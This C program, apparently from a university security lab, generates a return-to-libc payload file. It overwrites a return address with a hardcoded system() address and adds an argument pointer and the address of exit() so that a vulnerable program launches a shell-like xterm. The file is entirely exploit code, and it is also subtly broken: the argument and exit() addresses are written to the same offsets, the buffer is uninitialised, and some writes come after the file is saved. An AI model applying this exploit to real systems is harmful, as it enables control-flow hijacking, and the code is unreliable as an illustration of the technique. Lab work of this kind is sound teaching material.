/* gen_exploit.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SYSTEM 0xb7e573e0

int main(int argc, char **argv) {
	char buffer[40];
	FILE *exploit_file;

	exploit_file = fopen("./lab4file", "w");

	/* Place 3 addresses at offsets X, Y, and Z in lab4file.
		 A basic attack involves the address of the system function, a
		 string to pass to system(), and address of the exit() function. */
	
	//*(long *) &buffer[24] = SYSTEM ;
	//Set &system into 12 + 12 == return address of vuln.
	memset(buffer+24, 0xe0, 1);
	memset(buffer+25, 0x73, 1);
	memset(buffer+26, 0xe5, 1);
	memset(buffer+27, 0xb7, 1);

	//*(long *) &buffer[0] = 0xCDCDCDCD ;
	//Set Argument for system == xterm
	memset(buffer+32, 0x57, 1);
	memset(buffer+33, 0xfc, 1);
	memset(buffer+34, 0xff, 1);
	memset(buffer+35, 0xbf, 1);


	//*(long *) &buffer[0] = 0xEFEFEFEF ;
	//Set &exit in between == JUNK in the slides
	memset(buffer+32, 0xb0, 1);
	memset(buffer+33, 0xa1, 1);
	memset(buffer+34, 0xe4, 1);
	memset(buffer+35, 0xb7, 1);



	fwrite(buffer, sizeof(buffer), 1, exploit_file);

	buffer[0] = 0xAC;
	buffer[1] = 0xAC;
	buffer[2] = 0xAC;
	buffer[3] = 0xAC;

	fclose(exploit_file);
}
